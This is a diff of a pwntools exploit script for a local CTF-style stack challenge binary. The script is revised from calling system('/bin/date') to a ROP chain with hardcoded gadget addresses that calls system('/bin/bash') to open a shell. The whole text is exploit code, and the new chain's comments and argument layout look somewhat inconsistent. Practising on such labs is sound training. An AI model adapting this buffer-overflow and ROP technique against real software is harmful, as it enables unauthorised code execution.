@@ -1,31 +1,41 @@
 from pwn import *
-# Set up the binary and context
-context.binary = './pwn/stack/rop-2/rop2'
-binary = ELF('./pwn/stack/rop-2/rop2')
 
-# Start the process
-p = process(binary.path)
+# Path to the binary
+binary_path = './pwn/stack/rop-2/rop2'
 
-# Offsets and addresses
-buffer_size = 136  # Size of the buffer before return address
-system_plt = binary.plt['system']  # Address of system function
-bin_date = next(binary.search(b'/bin/date'))  # Address of '/bin/date' string
+# Start process
+p = process(binary_path)
 
-# Debugging: Print key addresses
-log.info(f"system@plt: {hex(system_plt)}")
-log.info(f"/bin/date address: {hex(bin_date)}")
+# Load the ELF binary
+elf = ELF(binary_path)
 
-# ROP chain
-payload = b'A' * buffer_size  # Overflow buffer
-payload += p32(system_plt)  # Address of system function
-payload += b'BBBB'  # Return address after system (can be anything)
-payload += p32(bin_date)  # Address of '/bin/date' string
+# Find the offset to the return address
+offset = 140
 
-# Debugging: Print the payload
-log.info(f"Payload: {payload}")
+# Gadgets found from ROPgadget
+pop_ebx_ret = 0x08048364
+pop_ebp_ret = 0x08048473
+pop_all_ret = 0x0804859c
+
+# Address of "/bin/bash" in the data section
+bin_bash = next(elf.search(b'/bin/bash'))
+
+# Address of system() in the PLT
+system_plt = elf.plt['system']
+
+# Build the ROP chain
+payload = flat([
+    b'A' * offset,                    # Padding to reach return address
+    pop_all_ret,                     # Gadget to pop arguments into registers
+    bin_bash,                        # Argument for system(): pointer to "/bin/bash"
+    0xdeadbeef,                      # Pop into esi (not used)
+    0xdeadbeef,                      # Pop into edi (not used)
+    0xdeadbeef,                      # Pop into ebp (not used)
+    system_plt                       # Call system()
+])
 
 # Send the payload
 p.sendline(payload)
 
-# Interact with the process to see the output
+# Pass interaction back to user
 p.interactive()
